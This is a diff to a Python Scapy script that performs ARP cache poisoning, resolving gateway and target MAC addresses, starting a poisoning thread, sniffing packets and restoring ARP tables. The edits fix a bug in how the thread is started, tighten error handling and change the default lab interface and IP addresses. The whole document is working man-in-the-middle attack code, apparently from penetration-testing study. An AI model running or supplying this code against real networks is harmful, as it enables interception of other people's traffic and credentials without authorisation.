@@ -5,11 +5,11 @@ import sys
 import threading
 
 def get_mac(ip_address):
-    responses, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address),
-        timeout=2, retry=10)
+    ans, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address),
+        timeout=4, retry=10)
 
     # Return MAC from a response
-    for s, r in responses:
+    for s, r in ans:
         return r[Ether].src
 
     return None
@@ -56,9 +56,9 @@ def main():
     if len(sys.argv) > 1:
         interface =  sys.argv[1]
     else:
-        interface = 'wlp3s0'
-        target_ip = '10.0.2.15'
-        gateway_ip = '10.0.2.2'
+        interface = 'eth0'
+        target_ip = '10.0.2.4'
+        gateway_ip = '10.0.2.1'
         packet_count = 1000
 
     conf.iface = interface
@@ -66,22 +66,24 @@ def main():
 
     print('[*] Setting up %s' % interface)
 
-    try:
-        gateway_mac = get_mac(gateway_ip)
-        print('[*] Gateway %s is at %s' % (gateway_ip, gateway_mac))
-    except Exception:
+    gateway_mac = get_mac(gateway_ip)
+
+    if gateway_mac == None:
         print('[!] Failed to obtain Gateway MAC: Exiting')
         sys.exit(0)
+    else:
+        print('[*] Gateway %s is at %s' % (gateway_ip, gateway_mac))
 
-    try:
-        target_mac = get_mac(target_ip)
-        print('[*] Target %s is at %s' % (target_ip, target_mac))
-    except Exception:
+    target_mac = get_mac(target_ip)
+
+    if target_mac == None:
         print('[!] Failed to obtain Target MAC: Exiting')
         sys.exit(0)
+    else:
+        print('[*] Target %s is at %s' % (target_ip, target_mac))
 
     poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
-    poison_target.start()
+    poison_thread.start()
 
     try:
         print('[*] Starting sniffer for %d packets' % packet_count)
@@ -92,6 +94,7 @@ def main():
         restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
     except KeyboardInterrupt:
         restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+        print('[*] Exiting')
         sys.exit(0)
 
 if __name__ == '__main__':
